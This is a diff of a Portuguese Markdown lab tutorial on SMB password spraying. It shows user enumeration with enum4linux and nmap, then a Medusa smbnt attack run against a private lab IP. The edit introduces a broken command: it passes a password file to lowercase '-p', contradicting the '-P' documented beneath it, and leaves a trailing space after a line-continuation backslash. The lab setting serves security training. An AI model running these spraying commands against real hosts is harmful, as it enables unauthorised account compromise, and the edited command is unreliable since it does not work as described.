@@ -255,26 +255,30 @@ No *password spraying*, testamos **uma senha comum** contra **vários usuários*
 ### Etapa 1 — Enumeração de usuários
 ```bash
 # Com enum4linux
-enum4linux -U 192.168.56.20
+enum4linux -U 192.168.1.114
 
 # Ou com Nmap
-nmap -p 445 --script smb-enum-users 192.168.56.20
+nmap -p 445 --script smb-enum-users 192.168.1.114
 ```
-Salve os usuários encontrados em `wordlists/usuarios_smb.txt`.
+Salve os usuários encontrados em `usuarios_smb.txt`.
+Crie uma lista de senhas em `senhas_spray.txt`.
 
 ### Etapa 2 — O spraying com Medusa
 ```bash
-medusa -h 192.168.56.20 \
-       -U wordlists/usuarios_smb.txt \
-       -p 'msfadmin' \
+ medusa -h 192.168.1.114 \
+       -U usuarios_smb.txt \ 
+       -p senhas_spray.txt \
        -M smbnt \
        -t 1
 ```
 
 - `-U` lista de usuários enumerados
-- `-p 'msfadmin'` **uma única** senha (característica do spraying)
+- `-P` lista de senhas
 - `-M smbnt` módulo SMB
 - `-t 1` baixa concorrência para simular um ataque "silencioso"
+
+<img width="1405" height="654" alt="06 - medusa-saida-smb" src="https://github.com/user-attachments/assets/aeec1b4d-42e4-4e1e-a766-f82168e8c11d" />
+
 
 ### Validação do acesso
 ```bash
